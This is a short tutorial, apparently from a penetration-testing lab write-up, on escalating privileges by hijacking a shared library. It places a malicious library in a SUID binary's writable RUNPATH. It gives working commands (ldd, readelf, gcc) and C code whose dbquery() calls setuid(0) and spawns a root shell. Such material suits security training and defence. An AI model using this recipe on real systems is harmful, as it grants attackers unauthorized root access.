## Shared Library Hijacking via RUNPATH

When a SUID binary has a writable directory in its `RUNPATH`, we can place a malicious shared library there that gets loaded before any system library — injecting code that runs with the binary's elevated privileges.

### 1. Inspect the binary's dependencies

```shell
ldd payroll
```

Look for non-standard libraries (e.g. `libshared.so`) — these are more likely to be loaded from custom paths.

### 2. Check the RUNPATH

```shell
readelf -d payroll | grep PATH
```

If the output points to a directory writable by our user (e.g. `/development`), that directory takes precedence over system library paths.

### 3. Identify the function the binary expects

Copy a real `.so` as a placeholder and run the binary to trigger the missing symbol error:

```shell
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```

Expected output:

```
./payroll: symbol lookup error: undefined symbol: dbquery
```

The binary is looking for a function named `dbquery` — we now know exactly what to implement.

### 4. Write the malicious library

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    setuid(0);
    system("/bin/sh -p");
}
```

### 5. Compile and place it in the RUNPATH directory

```shell
gcc src.c -fPIC -shared -o /development/libshared.so
```

### 6. Execute the binary

```shell
./payroll
```

The linker resolves `libshared.so` from `/development` first, calls our `dbquery()`, and spawns a root shell.

> 💡 The `-p` flag in `/bin/sh -p` preserves the effective UID set by `setuid(0)` — without it, some shells drop privileges on startup.
